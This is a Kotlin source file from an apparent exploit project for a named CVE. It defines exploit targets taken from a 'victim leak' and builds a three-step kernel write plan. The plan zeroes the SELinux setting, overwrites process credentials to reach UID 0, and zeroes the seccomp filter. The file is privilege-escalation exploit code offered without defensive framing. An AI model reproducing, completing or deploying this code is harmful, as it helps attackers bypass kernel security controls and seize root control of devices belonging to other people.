package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.core.steps.StepId
import com.ghostlock.app.engine.ktstep.KtStep
import com.ghostlock.app.engine.ktstep.KtStepPlan
import com.ghostlock.app.engine.ktstep.LayoutInputs
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.WriteMode

/** Concrete addresses/values needed for the W1/W2/W3 plan; supplied by profile + victim leak. */
data class Cve43499PlanTargets(
    val selinuxAddress: Long,
    val credentialAddress: Long,
    val seccompAddress: Long,
    val credentialValue: Long,
    val layoutInputs: LayoutInputs,
    val pageInputs: PayloadPageInputs,
    val pageSize: Int,
    val expectedUid: Long = 0L,
)

/** Builds the shared W1/W2/W3 plan; no defaults, every address must be supplied. */
object Cve43499PlanBuilder {
    fun build(targets: Cve43499PlanTargets): KtStepPlan = KtStepPlan(
        steps = mapOf(
            StepId.W1 to KtStep(
                StepId.W1,
                targets.selinuxAddress,
                WriteMode.Zero,
                preserveChild = true,
            ),
            StepId.W2 to KtStep(
                StepId.W2,
                targets.credentialAddress,
                WriteMode.Credential,
                preserveChild = true,
                value = targets.credentialValue,
            ),
            StepId.W3 to KtStep(
                StepId.W3,
                targets.seccompAddress,
                WriteMode.Zero,
                preserveChild = false,
            ),
        ),
        layoutInputs = targets.layoutInputs,
        pageInputs = targets.pageInputs,
        pageSize = targets.pageSize,
        expectedUid = targets.expectedUid,
    )
}
